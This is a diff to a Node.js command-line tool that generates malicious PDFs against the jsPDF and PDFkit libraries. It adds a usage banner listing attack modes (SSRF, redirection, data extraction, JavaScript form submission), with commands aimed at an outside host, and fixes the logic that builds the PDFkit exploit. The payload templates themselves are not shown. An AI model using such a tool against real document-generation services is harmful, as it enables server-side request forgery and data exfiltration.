@@ -3,16 +3,25 @@ const { version } = require('../package.json');
 const chalk = require('chalk');
 
 const parser = new ArgumentParser({
-  description: 'Argparse example'
+  description: 'Attack with PDF',
+  usage: " node main.js -l,--lib [jsPDF|PDFkit [-L,--list]] -e,--exploit [-o,--output] [-u,--URI] \n\t"+
+  chalk.blue("- [ Basic Examples ] -\n\t")+
+  "Attack-Mode  | Library | Example command\n\t" +
+  "=============+========================================================\n\t"+
+  "simple_js    |  jsPDF  | node main.js -l jsPDF -e simple_js\n\t"+
+  "PDFSSRF      |  jsPDF  | node main.js -l jsPDF -e PDFSSRF -u http.tacocat.tk\n\t"+
+  "Redirection  |  jsPDF  | node main.js -l jsPDF -e redirection -u http.tacocat.tk\n\t"+
+  "Extraction   |  jsPDF  | node main.js -l jsPDF -e extraction -u http.tacocat.tk\n\t"+
+  "Extraction   |  PDFkit | node main.js -l PDFkit -e js_submitForm -u http.tacocat.tk\n\t"
+
+
 });
  
-parser.add_argument('-v', '--version', { action: 'version', version });
-parser.add_argument('-e', '--exploit', { help: 'Specify exploit to use'});
 parser.add_argument('-l', '--lib', { help: 'Select library to exploit jsPDF or PDFkit', required:true});
-parser.add_argument('-L', '--List', { help: 'List avaliable exploits', action:'store_true' });
+parser.add_argument('-e', '--exploit', { help: 'Specify exploit to use'});
+parser.add_argument('-L', '--List', { help: 'List avaliable exploits for jsPDF or PDFkit library', action:'store_true' });
 parser.add_argument('-o', '--output', { help: 'Specify output file name'});
 parser.add_argument('-u', '--uri', { help: 'Specify URI to inject/SSRF'});
-// parser.add_argument('-k', '--kek', { help: 'Print n number of keks' });
 
 
 function list_jsPDF_exploits(){
@@ -96,12 +105,16 @@ function createExploit(vuln_lib, exploit, outname, direction='http://20.211.25.3
 		const PDFkit_template = require("./PDFkit_template.js");
 		const template_PDFkit = new PDFkit_template;
 		var PDFkit_dict = {'js_submitForm': template_PDFkit.js_submitForm} 
-		if (!(PDFkit_dict.hasOwnProperty(exploit)) ){
+		if (PDFkit_dict.hasOwnProperty(exploit) ){
 			console.log("[+] Generating " + exploit + " ....");
 			template_status = PDFkit_dict[exploit](outname, direction)
 			template_status.then(status => {
 			if (status[1] == 1){
-				return [1, "[+] Finished bake " + chalk.blue(exploit)]
+				if(status.length == 3){
+					return [1, "[+] Finished bake " + chalk.cyan(exploit) + ", saved to " + chalk.cyan(status[0]) + "\n\tURL: " + chalk.blue(direction)]	
+				} else {
+					return [1, "[+] Finished bake " + chalk.cyan(exploit) + ", saved to " + chalk.cyan(status[0])]			
+				}
 			}else {			
 				return [-1, chalk.red("[-] Failed to bake" + exploit)] 
 			}
